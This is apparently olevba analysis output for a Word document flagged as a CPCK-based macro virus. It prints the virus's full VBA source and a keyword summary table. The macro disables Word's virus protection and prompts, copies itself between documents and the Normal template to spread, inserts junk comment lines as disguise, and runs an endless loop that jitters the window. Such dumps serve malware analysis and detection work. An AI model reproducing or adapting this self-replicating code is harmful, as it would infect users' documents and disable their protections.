olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.CPCK-based-dccbf67ff937e27526dccd7fdd5dbccd3ab5c961
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.CPCK-based-dccbf67ff937e27526dccd7fdd5dbccd3ab5c961 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'unknown_6.docunknown_6.docHP LaserJet 5/5M - Enhanced on \\PRINTER\HP
On Error Resume Next
'unknown_6.docunknown_6.docHP LaserJet 5/5M - Enhanced on \\PRINTER\HP
Options.SaveNormalPrompt = 0
'unknown_6.docunknown_6.docHP LaserJet 5/5M - Enhanced on \\PRINTER\HP
Options.ConfirmConversions = 0
'unknown_6.docunknown_6.docHP LaserJet 5/5M - Enhanced on \\PRINTER\HP
FA65 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'unknown_6.docunknown_6.docHP LaserJet 5/5M - Enhanced on \\PRINTER\HP
Options.VirusProtection = 0
'unknown_6.docunknown_6.docHP LaserJet 5/5M - Enhanced on \\PRINTER\HP
DT71 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'unknown_6.docunknown_6.docHP LaserJet 5/5M - Enhanced on \\PRINTER\HP
Application.EnableCancelKey = 0
'unknown_6.docunknown_6.docHP LaserJet 5/5M - Enhanced on \\PRINTER\HP
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
'unknown_6.docunknown_6.docHP LaserJet 5/5M - Enhanced on \\PRINTER\HP
Set IS41 = ActiveDocument.VBProject.VBComponents.Item(1)
'unknown_6.docunknown_6.docHP LaserJet 5/5M - Enhanced on \\PRINTER\HP
SQ26 = True
'unknown_6.docunknown_6.docHP LaserJet 5/5M - Enhanced on \\PRINTER\HP
End If
'unknown_6.docunknown_6.docHP LaserJet 5/5M - Enhanced on \\PRINTER\HP
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
'unknown_6.docunknown_6.docHP LaserJet 5/5M - Enhanced on \\PRINTER\HP
Set IS41 = NormalTemplate.VBProject.VBComponents.Item(1)
'unknown_6.docunknown_6.docHP LaserJet 5/5M - Enhanced on \\PRINTER\HP
TR25 = True
'unknown_6.docunknown_6.docHP LaserJet 5/5M - Enhanced on \\PRINTER\HP
End If
'unknown_6.docunknown_6.docHP LaserJet 5/5M - Enhanced on \\PRINTER\HP
If TR25 <> True And SQ26 <> True Then GoTo NE9
'unknown_6.docunknown_6.docHP LaserJet 5/5M - Enhanced on \\PRINTER\HP
If TR25 = True Then IS41.CodeModule.AddFromString ("Sub AutoClose()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, FA65 - 1))
'unknown_6.docunknown_6.docHP LaserJet 5/5M - Enhanced on \\PRINTER\HP
If SQ26 = True Then IS41.CodeModule.AddFromString ("Sub AutoOpen()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, DT71 - 1))
'unknown_6.docunknown_6.docHP LaserJet 5/5M - Enhanced on \\PRINTER\HP
With IS41.CodeModule
'unknown_6.docunknown_6.docHP LaserJet 5/5M - Enhanced on \\PRINTER\HP
For x = 2 To (IS41.CodeModule.CountOfLines - 1) Step 2
'unknown_6.docunknown_6.docHP LaserJet 5/5M - Enhanced on \\PRINTER\HP
.replaceline x, "'" & Application.ActiveWindow & Application.ActiveDocument & Application.ActivePrinter
'unknown_6.docunknown_6.docHP LaserJet 5/5M - Enhanced on \\PRINTER\HP
Next x
'unknown_6.docunknown_6.docHP LaserJet 5/5M - Enhanced on \\PRINTER\HP
End With
'unknown_6.docunknown_6.docHP LaserJet 5/5M - Enhanced on \\PRINTER\HP
NE9:
'unknown_6.docunknown_6.docHP LaserJet 5/5M - Enhanced on \\PRINTER\HP
If DT71 <> 0 And FA65 = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'unknown_6.docunknown_6.docHP LaserJet 5/5M - Enhanced on \\PRINTER\HP
End Sub
'unknown_6.docunknown_6.docHP LaserJet 5/5M - Enhanced on \\PRINTER\HP
 If (Day(Now()) = 10) Then
'unknown_6.docunknown_6.docHP LaserJet 5/5M - Enhanced on \\PRINTER\HP
 End If
'unknown_6.docunknown_6.docHP LaserJet 5/5M - Enhanced on \\PRINTER\HP

'unknown_6.docunknown_6.docHP LaserJet 5/5M - Enhanced on \\PRINTER\HP
  
'unknown_6.docunknown_6.docHP LaserJet 5/5M - Enhanced on \\PRINTER\HP
    Dim maxHeight As Long
'unknown_6.docunknown_6.docHP LaserJet 5/5M - Enhanced on \\PRINTER\HP
    maxHeight = ActiveWindow.Height
'unknown_6.docunknown_6.docHP LaserJet 5/5M - Enhanced on \\PRINTER\HP
    maxHeight = maxHeight - 50
'unknown_6.docunknown_6.docHP LaserJet 5/5M - Enhanced on \\PRINTER\HP
    If (ActiveWindow.WindowState <> wdWindowStateNormal) Then
'unknown_6.docunknown_6.docHP LaserJet 5/5M - Enhanced on \\PRINTER\HP
    End If
'unknown_6.docunknown_6.docHP LaserJet 5/5M - Enhanced on \\PRINTER\HP
    ActiveWindow.Height = ActiveWindow.Height / 2
'unknown_6.docunknown_6.docHP LaserJet 5/5M - Enhanced on \\PRINTER\HP
    While (True)
'unknown_6.docunknown_6.docHP LaserJet 5/5M - Enhanced on \\PRINTER\HP
        
'unknown_6.docunknown_6.docHP LaserJet 5/5M - Enhanced on \\PRINTER\HP
        If Int(2 * Rnd) = 1 Then
'unknown_6.docunknown_6.docHP LaserJet 5/5M - Enhanced on \\PRINTER\HP
               ActiveWindow.Height = ActiveWindow.Height - 50
'unknown_6.docunknown_6.docHP LaserJet 5/5M - Enhanced on \\PRINTER\HP
                ActiveWindow.Height = ActiveWindow.Height + 50
'unknown_6.docunknown_6.docHP LaserJet 5/5M - Enhanced on \\PRINTER\HP
            
'unknown_6.docunknown_6.docHP LaserJet 5/5M - Enhanced on \\PRINTER\HP
                ActiveWindow.Width = ActiveWindow.Width - 50
'unknown_6.docunknown_6.docHP LaserJet 5/5M - Enhanced on \\PRINTER\HP
                ActiveWindow.Width = ActiveWindow.Width + 50
'unknown_6.docunknown_6.docHP LaserJet 5/5M - Enhanced on \\PRINTER\HP
            
'unknown_6.docunknown_6.docHP LaserJet 5/5M - Enhanced on \\PRINTER\HP
                ActiveWindow.VerticalPercentScrolled = ActiveWindow.VerticalPercentScrolled - 10
'unknown_6.docunknown_6.docHP LaserJet 5/5M - Enhanced on \\PRINTER\HP
                ActiveWindow.VerticalPercentScrolled = ActiveWindow.VerticalPercentScrolled + 10
'unknown_6.docunknown_6.docHP LaserJet 5/5M - Enhanced on \\PRINTER\HP
        Else
'unknown_6.docunknown_6.docHP LaserJet 5/5M - Enhanced on \\PRINTER\HP
            If (ActiveWindow.Height < 50) Then
'unknown_6.docunknown_6.docHP LaserJet 5/5M - Enhanced on \\PRINTER\HP
            Else
'unknown_6.docunknown_6.docHP LaserJet 5/5M - Enhanced on \\PRINTER\HP
            End If
'unknown_6.docunknown_6.docHP LaserJet 5/5M - Enhanced on \\PRINTER\HP
            If (ActiveWindow.Width < 50) Then
'unknown_6.docunknown_6.docHP LaserJet 5/5M - Enhanced on \\PRINTER\HP
            Else
'unknown_6.docunknown_6.docHP LaserJet 5/5M - Enhanced on \\PRINTER\HP
            End If
'unknown_6.docunknown_6.docHP LaserJet 5/5M - Enhanced on \\PRINTER\HP
            If (ActiveWindow.VerticalPercentScrolled < 10) Then
'unknown_6.docunknown_6.docHP LaserJet 5/5M - Enhanced on \\PRINTER\HP
            Else
'unknown_6.docunknown_6.docHP LaserJet 5/5M - Enhanced on \\PRINTER\HP
            End If
'unknown_6.docunknown_6.docHP LaserJet 5/5M - Enhanced on \\PRINTER\HP
        Start = Timer   ' Set start time.
'unknown_6.docunknown_6.docHP LaserJet 5/5M - Enhanced on \\PRINTER\HP
            DoEvents    ' Yield to other processes.
'unknown_6.docunknown_6.docHP LaserJet 5/5M - Enhanced on \\PRINTER\HP
    Wend
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

